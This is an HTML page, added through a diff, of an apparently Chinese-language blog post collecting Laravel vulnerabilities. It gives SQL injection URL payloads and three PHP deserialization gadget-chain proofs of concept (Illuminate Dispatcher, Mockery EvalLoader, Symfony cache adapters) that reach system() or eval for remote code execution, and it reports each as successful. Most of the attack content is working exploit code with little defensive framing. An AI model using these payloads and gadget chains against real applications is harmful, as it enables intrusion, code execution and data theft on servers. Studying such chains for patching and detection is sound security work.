@@ -1,0 +1,44 @@
+<div class="article_content clearfix" id="article_content">
+<link href="style.css" rel="stylesheet"/>
+<div class="htmledit_views" id="content_views">
+<h1> Laravel 漏洞合集</h1>
+<h2>Laravel 存在SQL注入漏洞</h2>
+<h3>poc:</h3>
+<p>/test?email=1&amp;id=1 union select user()#</p>
+<p>/test?email=1/`&amp;id=1&amp;column=/ union select user()--+-</p>
+<p>可以看的注入成功</p>
+<p></p>
+<h2>Laravel 反序列化漏洞</h2>
+<h3>一.   poc:</h3>
+<p>&lt;?php<br/> namespace Illuminate\Broadcasting{<!-- --></p>
+<p>    use Illuminate\Bus\Dispatcher;<br/>     use Illuminate\Foundation\Console\QueuedCommand;</p>
+<p>    class PendingBroadcast<br/>     {<!-- --><br/>         protected $events;<br/>         protected $event;<br/>         public function __construct(){<!-- --><br/>             $this-&gt;events=new Dispatcher();<br/>             $this-&gt;event=new QueuedCommand();<br/>         }<br/>     }<br/> }<br/> namespace Illuminate\Foundation\Console{<!-- --><br/>     class QueuedCommand<br/>     {<!-- --><br/>         public $connection="dir";<br/>     }<br/> }<br/> namespace Illuminate\Bus{<!-- --><br/>     class Dispatcher<br/>     {<!-- --><br/>         protected $queueResolver="system";</p>
+<p>    }<br/> }<br/> namespace{<!-- --></p>
+<p>    use Illuminate\Broadcasting\PendingBroadcast;</p>
+<p>    echo urlencode(serialize(new PendingBroadcast()));<br/> }</p>
+<p><img alt="" height="654" src="image\20210819131857702.png" width="1200"/></p>
+<p> 发现得到回显</p>
+<p></p>
+<h3>二.    poc:</h3>
+<p>&lt;?php<br/> namespace Illuminate\Broadcasting{<!-- --></p>
+<p>    use Illuminate\Bus\Dispatcher;<br/>     use Illuminate\Foundation\Console\QueuedCommand;</p>
+<p>    class PendingBroadcast<br/>     {<!-- --><br/>         protected $events;<br/>         protected $event;<br/>         public function __construct(){<!-- --><br/>             $this-&gt;events=new Dispatcher();<br/>             $this-&gt;event=new QueuedCommand();<br/>         }<br/>     }<br/> }<br/> namespace Illuminate\Foundation\Console{<!-- --></p>
+<p>    use Mockery\Generator\MockDefinition;</p>
+<p>    class QueuedCommand<br/>     {<!-- --><br/>         public $connection;<br/>         public function __construct(){<!-- --><br/>             $this-&gt;connection=new MockDefinition();<br/>         }<br/>     }<br/> }<br/> namespace Illuminate\Bus{<!-- --></p>
+<p>    use Mockery\Loader\EvalLoader;</p>
+<p>    class Dispatcher<br/>     {<!-- --><br/>         protected $queueResolver;<br/>         public function __construct(){<!-- --><br/>             $this-&gt;queueResolver=[new EvalLoader(),'load'];<br/>         }<br/>     }<br/> }<br/> namespace Mockery\Loader{<!-- --><br/>     class EvalLoader<br/>     {<!-- --></p>
+<p>    }<br/> }<br/> namespace Mockery\Generator{<!-- --><br/>     class MockDefinition<br/>     {<!-- --><br/>         protected $config;<br/>         protected $code;<br/>         public function __construct()<br/>         {<!-- --><br/>             $this-&gt;code="&lt;?php phpinfo();exit()?&gt;";<br/>             $this-&gt;config=new MockConfiguration();<br/>         }<br/>     }<br/>     class MockConfiguration<br/>     {<!-- --><br/>         protected $name="feng";<br/>     }<br/> }</p>
+<p>namespace{<!-- --></p>
+<p>    use Illuminate\Broadcasting\PendingBroadcast;</p>
+<p>    echo urlencode(serialize(new PendingBroadcast()));<br/> }</p>
+<p>这个POC就更加舒服了，因为利用的是eval，可以任意执行代码，不仅仅局限于单参数的函数了。而且注意这个：$this-&gt;code="&lt;?php phpinfo();exit()?&gt;";<br/> 加上了exit()，提前结束了进程，这样调用完call_user_func，后面的代码就不会执行，也就不会抛出异常了，更加好了。<br/>  </p>
+<h3>三.   poc:</h3>
+<p>&lt;?php<br/> namespace Symfony\Component\Cache\Adapter{<!-- --></p>
+<p>    use Symfony\Component\Cache\CacheItem;</p>
+<p>    class TagAwareAdapter<br/>     {<!-- --><br/>         private $deferred;<br/>         public function __construct(){<!-- --><br/>             $this-&gt;pool=new ProxyAdapter();<br/>             $this-&gt;deferred=array(<br/>                 'feng'=&gt;new CacheItem()<br/>             );<br/>         }<br/>     }<br/> }<br/> namespace Symfony\Component\Cache{<!-- --><br/>     final class CacheItem{<!-- --><br/>         protected $poolHash="1";<br/>         protected $innerItem="dir";<br/>     }<br/> }<br/> namespace Symfony\Component\Cache\Adapter{<!-- --><br/>     class ProxyAdapter<br/>     {<!-- --><br/>         private $poolHash="1";<br/>         private $setInnerItem="system";<br/>     }<br/> }<br/> namespace{<!-- --></p>
+<p>    use Symfony\Component\Cache\Adapter\TagAwareAdapter;</p>
+<p>    echo urlencode(serialize(new TagAwareAdapter()));<br/> }</p>
+<p><img alt="" height="539" src="image\20210819132148115.png" width="1170"/></p>
+<p> 执行成功</p>
+</div>
+</div>
